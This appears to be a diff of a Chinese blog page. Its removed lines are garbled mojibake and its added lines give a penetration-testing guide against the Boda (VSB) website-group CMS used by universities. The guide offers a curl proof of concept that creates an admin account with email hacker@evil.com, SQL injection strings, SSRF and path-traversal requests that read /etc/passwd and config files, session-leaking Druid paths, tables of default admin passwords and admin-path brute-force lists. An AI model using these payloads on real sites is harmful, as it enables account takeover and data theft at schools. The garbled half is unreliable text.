-<hr>
-<h3 id="4-4-浠绘剰瀵嗙爜閲嶇疆"><a href="#4-4-浠绘剰瀵嗙爜閲嶇疆" class="headerlink" title="4.4 浠绘剰瀵嗙爜閲嶇疆"></a>4.4 浠绘剰瀵嗙爜閲嶇疆</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?鎺ョ绠＄悊鍛樿处鍙?<br>瀵嗙爜閲嶇疆 API 浠呴渶瀛﹀彿&#x2F;宸ュ彿&#x2F;閭鍗冲彲閲嶇疆锛屾棤浜屾楠岃瘉銆?</p>
-<h4 id="娴嬭瘯璺緞-2"><a href="#娴嬭瘯璺緞-2" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/resetPassword</span><br><span class="line">POST /api/user/forgot</span><br><span class="line">POST /api/user/resetPwd</span><br><span class="line">POST /vsb/user/resetPass</span><br></pre></td></tr></table></figure>
+<h4 id="测试-PoC-1"><a href="#测试-PoC-1" class="headerlink" title="测试 PoC"></a>测试 PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="literal">-X</span> POST <span class="string">&quot;http://target.com/api/user/add&quot;</span> `</span><br><span class="line">  <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> `</span><br><span class="line">  <span class="literal">-d</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;username&quot;: &quot;hacker&quot;,</span></span><br><span class="line"><span class="string">    &quot;password&quot;: &quot;Hacker123!&quot;,</span></span><br><span class="line"><span class="string">    &quot;role&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">    &quot;email&quot;: &quot;hacker@evil.com&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="4-5-SQL-娉ㄥ叆"><a href="#4-5-SQL-娉ㄥ叆" class="headerlink" title="4.5 SQL 娉ㄥ叆"></a>4.5 SQL 娉ㄥ叆</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?鍙兘瀵艰嚧鍚庡彴鐧诲綍缁曡繃鎴栨暟鎹硠闇?<br>API 鍙傛暟鐩存帴鎷兼帴 SQL 璇彞锛屾湭鍋氬弬鏁板寲澶勭悊銆?</p>
-<h4 id="娴嬭瘯鍏ュ彛"><a href="#娴嬭瘯鍏ュ彛" class="headerlink" title="娴嬭瘯鍏ュ彛"></a>娴嬭瘯鍏ュ彛</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/site/list?siteId=1 UNION SELECT ...</span><br><span class="line">GET  /api/article/list?categoryId=1&#x27;</span><br><span class="line">POST /api/user/login?username=admin&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<h3 id="4-4-任意密码重置"><a href="#4-4-任意密码重置" class="headerlink" title="4.4 任意密码重置"></a>4.4 任意密码重置</h3><p><strong>风险</strong>：中高危 — 接管管理员账号</p>
+<p>密码重置 API 仅需学号&#x2F;工号&#x2F;邮箱即可重置，无二次验证。</p>
+<h4 id="测试路径-2"><a href="#测试路径-2" class="headerlink" title="测试路径"></a>测试路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/resetPassword</span><br><span class="line">POST /api/user/forgot</span><br><span class="line">POST /api/user/resetPwd</span><br><span class="line">POST /vsb/user/resetPass</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="4-6-Druid-鐩戞帶鏈巿鏉"><a href="#4-6-Druid-鐩戞帶鏈巿鏉" class="headerlink" title="4.6 Druid 鐩戞帶鏈巿鏉?"></a>4.6 Druid 鐩戞帶鏈巿鏉?</h3><p><strong>椋庨櫓</strong>锛氫腑楂?鈥?鍗氳揪绔欑兢甯歌閰嶇疆</p>
-<p>鍗氳揪绔欑兢甯搁泦鎴愰樋閲屽反宸?Druid 鏁版嵁搴撹繛鎺ユ睜銆傝嫢鏈厤缃闂潈闄愶紝鍙洿鎺ヨ闂洃鎺ч〉銆?</p>
-<h4 id="娴嬭瘯璺緞-3"><a href="#娴嬭瘯璺緞-3" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/druid/index.html</span><br><span class="line">/druid/login.html</span><br><span class="line">/druid/sql.html         鈫?鍙煡鐪?SQL 鎵ц璁板綍</span><br><span class="line">/druid/spring.html      鈫?Spring 鐩戞帶</span><br><span class="line">/druid/websession.html  鈫?Session 娉勯湶</span><br></pre></td></tr></table></figure>
-
-<h2 id="鍗卞锛氶€氳繃-Session-娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇-鈫-鑾峰彇鍚庡彴鏉冮檺銆"><a href="#鍗卞锛氶€氳繃-Session-娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇-鈫-鑾峰彇鍚庡彴鏉冮檺銆" class="headerlink" title="鍗卞锛氶€氳繃 Session 娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇?鈫?鑾峰彇鍚庡彴鏉冮檺銆?"></a><strong>鍗卞</strong>锛氶€氳繃 Session 娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇?鈫?鑾峰彇鍚庡彴鏉冮檺銆?</h2><h3 id="4-7-Swagger-API-鏂囨。娉勯湶"><a href="#4-7-Swagger-API-鏂囨。娉勯湶" class="headerlink" title="4.7 Swagger API 鏂囨。娉勯湶"></a>4.7 Swagger API 鏂囨。娉勯湶</h3><p><strong>椋庨櫓</strong>锛氫腑楂?鈥?鍏ㄩ噺 API 鎺ュ彛涓€瑙堟棤浣?<br>鑻ュ崥杈句簩娆″紑鍙戦泦鎴愪簡 Swagger 涓旀湭鍏抽棴鐢熶骇鐜灞曠ず锛屽彲鑾峰彇鍏ㄥ API 鎺ュ彛銆?</p>
-<h4 id="娴嬭瘯璺緞-4"><a href="#娴嬭瘯璺緞-4" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/swagger-ui.html</span><br><span class="line">/swagger-ui.html#/</span><br><span class="line">/v2/api-docs</span><br><span class="line">/swagger-resources</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/api-docs</span><br></pre></td></tr></table></figure>
+<h3 id="4-5-SQL-注入"><a href="#4-5-SQL-注入" class="headerlink" title="4.5 SQL 注入"></a>4.5 SQL 注入</h3><p><strong>风险</strong>：中高危 — 可能导致后台登录绕过或数据泄露</p>
+<p>API 参数直接拼接 SQL 语句，未做参数化处理。</p>
+<h4 id="测试入口"><a href="#测试入口" class="headerlink" title="测试入口"></a>测试入口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/site/list?siteId=1 UNION SELECT ...</span><br><span class="line">GET  /api/article/list?categoryId=1&#x27;</span><br><span class="line">POST /api/user/login?username=admin&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="浜斻€佷腑鍗辨紡娲烇紙P2-P3锛"><a href="#浜斻€佷腑鍗辨紡娲烇紙P2-P3锛" class="headerlink" title="浜斻€佷腑鍗辨紡娲烇紙P2-P3锛?"></a>浜斻€佷腑鍗辨紡娲烇紙P2-P3锛?</h2><h3 id="5-1-SSRF锛堟湇鍔＄璇锋眰浼€狅級"><a href="#5-1-SSRF锛堟湇鍔＄璇锋眰浼€狅級" class="headerlink" title="5.1 SSRF锛堟湇鍔＄璇锋眰浼€狅級"></a>5.1 SSRF锛堟湇鍔＄璇锋眰浼€狅級</h3><p><strong>椋庨櫓</strong>锛氫腑绛?鈥?鍙帰娴嬪唴缃?<br>API 涓瓨鍦?URL 鍙傛暟锛堢珯鐐瑰鍏?杩滅▼鍙戝竷&#x2F;RSS 鎶撳彇锛夛紝鏈檺鍒跺唴缃戠洰鏍囥€?</p>
-<h4 id="娴嬭瘯鍏ュ彛-1"><a href="#娴嬭瘯鍏ュ彛-1" class="headerlink" title="娴嬭瘯鍏ュ彛"></a>娴嬭瘯鍏ュ彛</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/import?url=http://127.0.0.1:8080/</span><br><span class="line">POST /api/site/import?url=http://192.168.x.x:8080/</span><br><span class="line">GET  /api/rss/fetch?url=http://鍐呯綉IP:绔彛/</span><br></pre></td></tr></table></figure>
+<h3 id="4-6-Druid-监控未授权"><a href="#4-6-Druid-监控未授权" class="headerlink" title="4.6 Druid 监控未授权"></a>4.6 Druid 监控未授权</h3><p><strong>风险</strong>：中高 — 博达站群常见配置</p>
+<p>博达站群常集成阿里巴巴 Druid 数据库连接池。若未配置访问权限，可直接访问监控页。</p>
+<h4 id="测试路径-3"><a href="#测试路径-3" class="headerlink" title="测试路径"></a>测试路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/druid/index.html</span><br><span class="line">/druid/login.html</span><br><span class="line">/druid/sql.html         → 可查看 SQL 执行记录</span><br><span class="line">/druid/spring.html      → Spring 监控</span><br><span class="line">/druid/websession.html  → Session 泄露</span><br></pre></td></tr></table></figure>
 
-<h4 id="鍒╃敤"><a href="#鍒╃敤" class="headerlink" title="鍒╃敤"></a>鍒╃敤</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鎺㈡祴鍐呯綉瀛樻椿</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/import?url=http://192.168.1.1:22&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/import?url=http://172.16.0.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍥炴樉 SSRF锛堝鏋滄敮鎸侊級</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/fetch?url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>危害</strong>：通过 Session 泄露直接窃取管理员会话 → 获取后台权限。</p>
+<hr>
+<h3 id="4-7-Swagger-API-文档泄露"><a href="#4-7-Swagger-API-文档泄露" class="headerlink" title="4.7 Swagger API 文档泄露"></a>4.7 Swagger API 文档泄露</h3><p><strong>风险</strong>：中高 — 全量 API 接口一览无余</p>
+<p>若博达二次开发集成了 Swagger 且未关闭生产环境展示，可获取全套 API 接口。</p>
+<h4 id="测试路径-4"><a href="#测试路径-4" class="headerlink" title="测试路径"></a>测试路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/swagger-ui.html</span><br><span class="line">/swagger-ui.html#/</span><br><span class="line">/v2/api-docs</span><br><span class="line">/swagger-resources</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/api-docs</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="5-2-鐩綍閬嶅巻-浠绘剰鏂囦欢璇诲彇"><a href="#5-2-鐩綍閬嶅巻-浠绘剰鏂囦欢璇诲彇" class="headerlink" title="5.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇"></a>5.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇</h3><p><strong>椋庨櫓</strong>锛氫腑绛?鈥?鍙鍙栭厤缃枃浠躲€佹簮鐮?</p>
-<h4 id="娴嬭瘯鍏ュ彛-2"><a href="#娴嬭瘯鍏ュ彛-2" class="headerlink" title="娴嬭瘯鍏ュ彛"></a>娴嬭瘯鍏ュ彛</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /api/download?file=../../../etc/passwd</span><br><span class="line">GET /api/file/read?path=../../../WEB-INF/web.xml</span><br><span class="line">GET /vsb/readFile?path=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="五、中危漏洞（P2-P3）"><a href="#五、中危漏洞（P2-P3）" class="headerlink" title="五、中危漏洞（P2-P3）"></a>五、中危漏洞（P2-P3）</h2><h3 id="5-1-SSRF（服务端请求伪造）"><a href="#5-1-SSRF（服务端请求伪造）" class="headerlink" title="5.1 SSRF（服务端请求伪造）"></a>5.1 SSRF（服务端请求伪造）</h3><p><strong>风险</strong>：中等 — 可探测内网</p>
+<p>API 中存在 URL 参数（站点导入&#x2F;远程发布&#x2F;RSS 抓取），未限制内网目标。</p>
+<h4 id="测试入口-1"><a href="#测试入口-1" class="headerlink" title="测试入口"></a>测试入口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/import?url=http://127.0.0.1:8080/</span><br><span class="line">POST /api/site/import?url=http://192.168.x.x:8080/</span><br><span class="line">GET  /api/rss/fetch?url=http://内网IP:端口/</span><br></pre></td></tr></table></figure>
 
-<h4 id="鍏抽敭璇诲彇鐩爣"><a href="#鍏抽敭璇诲彇鐩爣" class="headerlink" title="鍏抽敭璇诲彇鐩爣"></a>鍏抽敭璇诲彇鐩爣</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml        鈫?鏌ョ湅 Servlet 鏄犲皠鍜岄厤缃?/WEB-INF/classes/       鈫?鍙嶇紪璇戣幏鍙栨暟鎹簱閰嶇疆</span><br><span class="line">/opt/vsb9/config/*.properties  鈫?鏁版嵁搴?Redis 閰嶇疆</span><br><span class="line">/etc/passwd             鈫?Linux 璐︽埛</span><br><span class="line">/opt/vsb9/manager/WEB-INF/lib/ 鈫?鍏ㄩ噺 Jar 鍖呭垎鏋愭紡娲?```</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 5.3 瀛樺偍鍨?XSS</span><br><span class="line"></span><br><span class="line">**椋庨櫓**锛氫腑绛?鈥?鍙姭鎸佺鐞嗗憳浼氳瘽</span><br><span class="line"></span><br><span class="line">鍐呭鍙戝竷/璇勮/鐣欒█ API 鏈繃婊?HTML锛屾姇绋夸腑鍖呭惈鎭舵剰鑴氭湰銆?</span><br><span class="line">#### 娴嬭瘯鍏ュ彛</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>POST &#x2F;api&#x2F;comment&#x2F;add      鈫?鐣欒█ XSS<br>POST &#x2F;api&#x2F;article&#x2F;submit   鈫?鎶曠 XSS<br>POST &#x2F;api&#x2F;guestbook&#x2F;add    鈫?鐣欒█鏉?XSS</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 5.4 寮卞彛浠?/ 榛樿鍙ｄ护</span><br><span class="line"></span><br><span class="line">**椋庨櫓**锛氫腑绛?鈥?鐩存帴鐧诲綍鍚庡彴</span><br><span class="line"></span><br><span class="line">鍗氳揪绔欑兢绯荤粺榛樿鍚庡彴璺緞甯镐负 `/vsb/admin/`锛岄儴鍒嗗鏍℃湭淇敼榛樿瀵嗙爜銆?</span><br><span class="line">#### 甯歌榛樿鍙ｄ护</span><br><span class="line"></span><br><span class="line">| 鐢ㄦ埛鍚?| 瀵嗙爜 | 璇存槑 |</span><br><span class="line">|:------|:-----|:-----|</span><br><span class="line">| admin | admin | 榛樿绠＄悊鍛?|</span><br><span class="line">| admin | admin123 | 甯歌寮卞彛浠?|</span><br><span class="line">| admin | 123456 | 甯歌寮卞彛浠?|</span><br><span class="line">| root | root | 閮ㄥ垎閮ㄧ讲 |</span><br><span class="line">| vsbadmin | vsbadmin | 绯荤粺绠＄悊 |</span><br><span class="line"></span><br><span class="line">#### 鍚庡彴璺緞鐖嗙牬</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 甯歌鍚庡彴璺緞</span><br><span class="line">/vsb/admin/</span><br><span class="line">/siteadmin/</span><br><span class="line">/vsb/manager/</span><br><span class="line">/vsb/console/</span><br><span class="line">/admin/</span><br><span class="line">/manager/</span><br></pre></td></tr></table></figure>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 探测内网存活</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/import?url=http://192.168.1.1:22&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/import?url=http://172.16.0.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回显 SSRF（如果支持）</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/fetch?url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄"><a href="#鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄" class="headerlink" title="鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?"></a>鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?</h2><table>
+<h3 id="5-2-目录遍历-任意文件读取"><a href="#5-2-目录遍历-任意文件读取" class="headerlink" title="5.2 目录遍历 &#x2F; 任意文件读取"></a>5.2 目录遍历 &#x2F; 任意文件读取</h3><p><strong>风险</strong>：中等 — 可读取配置文件、源码</p>
+<h4 id="测试入口-2"><a href="#测试入口-2" class="headerlink" title="测试入口"></a>测试入口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /api/download?file=../../../etc/passwd</span><br><span class="line">GET /api/file/read?path=../../../WEB-INF/web.xml</span><br><span class="line">GET /vsb/readFile?path=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="关键读取目标"><a href="#关键读取目标" class="headerlink" title="关键读取目标"></a>关键读取目标</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml        → 查看 Servlet 映射和配置</span><br><span class="line">/WEB-INF/classes/       → 反编译获取数据库配置</span><br><span class="line">/opt/vsb9/config/*.properties  → 数据库/Redis 配置</span><br><span class="line">/etc/passwd             → Linux 账户</span><br><span class="line">/opt/vsb9/manager/WEB-INF/lib/ → 全量 Jar 包分析漏洞</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-3-存储型-XSS"><a href="#5-3-存储型-XSS" class="headerlink" title="5.3 存储型 XSS"></a>5.3 存储型 XSS</h3><p><strong>风险</strong>：中等 — 可劫持管理员会话</p>
+<p>内容发布&#x2F;评论&#x2F;留言 API 未过滤 HTML，投稿中包含恶意脚本。</p>
+<h4 id="测试入口-3"><a href="#测试入口-3" class="headerlink" title="测试入口"></a>测试入口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /api/comment/add      → 留言 XSS</span><br><span class="line">POST /api/article/submit   → 投稿 XSS</span><br><span class="line">POST /api/guestbook/add    → 留言板 XSS</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-4-弱口令-默认口令"><a href="#5-4-弱口令-默认口令" class="headerlink" title="5.4 弱口令 &#x2F; 默认口令"></a>5.4 弱口令 &#x2F; 默认口令</h3><p><strong>风险</strong>：中等 — 直接登录后台</p>
+<p>博达站群系统默认后台路径常为 <code>/vsb/admin/</code>，部分学校未修改默认密码。</p>
+<h4 id="常见默认口令"><a href="#常见默认口令" class="headerlink" title="常见默认口令"></a>常见默认口令</h4><table>
 <thead>
 <tr>
-<th align="left">澹版槑鍐呭</th>
-<th align="left">鏉ユ簮</th>
+<th align="left">用户名</th>
+<th align="left">密码</th>
+<th align="left">说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">鍗氳揪缃戠珯缇ょ郴鍒椾骇鍝?*鍩轰簬 Java 寮€鍙?*锛屼絾<strong>鏈娇鐢?Struts&#x2F;Struts2 妗嗘灦</strong>锛屼笉鍙?Struts2 鐩稿叧婕忔礊褰卞搷</td>
-<td align="left">鍗氳揪瀹樼綉瀹夊叏澹版槑 <a target="_blank" rel="noopener" href="https://www.chinawebber.com/info/1302/2757.htm">$TRAE_REF</a></td>
+<td align="left">admin</td>
+<td align="left">admin</td>
+<td align="left">默认管理员</td>
 </tr>
 <tr>
-<td align="left">瀹樻柟鏈叕寮€鎶湶杩囧叿浣?CVE 婕忔礊缂栧彿锛堝晢涓氶棴婧愶級</td>
-<td align="left">鎼滅储寮曟搸妫€绱㈢粨鏋?</td>
+<td align="left">admin</td>
+<td align="left">admin123</td>
+<td align="left">常见弱口令</td>
 </tr>
 <tr>
-<td align="left">鍗氳揪閫氬父閫氳繃鐗堟湰杩唬淇婕忔礊锛圴SB8 鈫?VSB9 鈫?鍏ㄥ獟浣撶増锛?</td>
-<td align="left">琛屼笟鎯緥</td>
+<td align="left">admin</td>
+<td align="left">123456</td>
+<td align="left">常见弱口令</td>
+</tr>
+<tr>
+<td align="left">root</td>
+<td align="left">root</td>
+<td align="left">部分部署</td>
+</tr>
+<tr>
+<td align="left">vsbadmin</td>
+<td align="left">vsbadmin</td>
+<td align="left">系统管理</td>
+</tr>
+</tbody></table>
+<h4 id="后台路径爆破"><a href="#后台路径爆破" class="headerlink" title="后台路径爆破"></a>后台路径爆破</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常见后台路径</span></span><br><span class="line">/vsb/admin/</span><br><span class="line">/siteadmin/</span><br><span class="line">/vsb/manager/</span><br><span class="line">/vsb/console/</span><br><span class="line">/admin/</span><br><span class="line">/manager/</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、已知官方安全声明"><a href="#六、已知官方安全声明" class="headerlink" title="六、已知官方安全声明"></a>六、已知官方安全声明</h2><table>
+<thead>
+<tr>
+<th align="left">声明内容</th>
+<th align="left">来源</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">博达网站群系列产品<strong>基于 Java 开发</strong>，但<strong>未使用 Struts&#x2F;Struts2 框架</strong>，不受 Struts2 相关漏洞影响</td>
+<td align="left">博达官网安全声明 <a target="_blank" rel="noopener" href="https://www.chinawebber.com/info/1302/2757.htm">$TRAE_REF</a></td>
+</tr>
+<tr>
+<td align="left">官方未公开披露过具体 CVE 漏洞编号（商业闭源）</td>
+<td align="left">搜索引擎检索结果</td>
+</tr>
+<tr>
+<td align="left">博达通常通过版本迭代修复漏洞（VSB8 → VSB9 → 全媒体版）</td>
+<td align="left">行业惯例</td>
 </tr>
 </tbody></table>
 <blockquote>
-<p>铏界劧娌℃湁鍏紑鐨?CVE 鍒楄〃锛屼絾鍗氳揪浣滀负鍟嗕笟闂簮绯荤粺锛屽叾 API 閴存潈鐨勫畨鍏ㄦ€у畬鍏ㄤ緷璧栧巶鍟嗕唬鐮佽川閲忋€傚ぇ閲忛珮鏍′粛鍦ㄤ娇鐢ㄨ€佹棫鐗堟湰锛堝 VSB8銆乂SB9 鏃╂湡鐗堬級锛岃繖浜涚増鏈緢鍙兘瀛樺湪鏈慨澶嶇殑 API 鏈巿鏉冮棶棰樸€?</p>
+<p>虽然没有公开的 CVE 列表，但博达作为商业闭源系统，其 API 鉴权的安全性完全依赖厂商代码质量。大量高校仍在使用老旧版本（如 VSB8、VSB9 早期版），这些版本很可能存在未修复的 API 未授权问题。</p>
 </blockquote>
 <hr>
-<h2 id="涓冦€佸疄鎴樻娴-Checklist"><a href="#涓冦€佸疄鎴樻娴-Checklist" class="headerlink" title="涓冦€佸疄鎴樻娴?Checklist"></a>涓冦€佸疄鎴樻娴?Checklist</h2><h3 id="Phase-0锛氭寚绾圭‘璁"><a href="#Phase-0锛氭寚绾圭‘璁" class="headerlink" title="Phase 0锛氭寚绾圭‘璁?"></a>Phase 0锛氭寚绾圭‘璁?</h3><ul>
-<li><input disabled="" type="checkbox"> 椤甸潰搴曢儴鏄惁鏈?&#96;Powered by 鍗氳揪缃戠珯缇</li>
-<li><input disabled="" type="checkbox"> HTML 涓槸鍚﹀寘鍚?<code>vsbclub</code> 鎴?<code>VSB</code></li>
-<li><input disabled="" type="checkbox"> 鏄惁瀛樺湪 <code>/vsb/admin/</code> 鍚庡彴</li>
-<li><input disabled="" type="checkbox"> 鍝嶅簲澶存槸鍚﹀寘鍚?<code>X-Powered-By: VSB</code></li>
+<h2 id="七、实战检测-Checklist"><a href="#七、实战检测-Checklist" class="headerlink" title="七、实战检测 Checklist"></a>七、实战检测 Checklist</h2><h3 id="Phase-0：指纹确认"><a href="#Phase-0：指纹确认" class="headerlink" title="Phase 0：指纹确认"></a>Phase 0：指纹确认</h3><ul>
+<li><input disabled="" type="checkbox"> 页面底部是否有 <code>Powered by 博达网站群</code></li>
+<li><input disabled="" type="checkbox"> HTML 中是否包含 <code>vsbclub</code> 或 <code>VSB</code></li>
+<li><input disabled="" type="checkbox"> 是否存在 <code>/vsb/admin/</code> 后台</li>
+<li><input disabled="" type="checkbox"> 响应头是否包含 <code>X-Powered-By: VSB</code></li>
 </ul>
-<h3 id="Phase-1锛氫俊鎭敹闆"><a href="#Phase-1锛氫俊鎭敹闆" class="headerlink" title="Phase 1锛氫俊鎭敹闆?"></a>Phase 1锛氫俊鎭敹闆?</h3><ul>
-<li><input disabled="" type="checkbox"> Swagger 鏂囨。娉勯湶妫€娴嬶細<code>/swagger-ui.html</code> <code>/v2/api-docs</code></li>
-<li><input disabled="" type="checkbox"> Druid 鐩戞帶鏈巿鏉冿細<code>/druid/index.html</code></li>
-<li><input disabled="" type="checkbox"> 鏁忔劅璺緞鐖嗙牬锛歚&#x2F;api&#x2F;<code> </code>&#x2F;vsb&#x2F;api&#x2F;<code> </code>&#x2F;cms&#x2F;api&#x2F;&#96;</li>
-<li><input disabled="" type="checkbox"> JS 鏂囦欢鍙嶇紪璇戯細鎼滅储 <code>api/</code> 鍏抽敭瀛?<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 蹇€?JS 鍙嶇紪璇戞壘 API</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/vsb/js/main.js&quot;</span> | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&quot;api/|\.do|\.action&quot;</span></span><br></pre></td></tr></table></figure></li>
+<h3 id="Phase-1：信息收集"><a href="#Phase-1：信息收集" class="headerlink" title="Phase 1：信息收集"></a>Phase 1：信息收集</h3><ul>
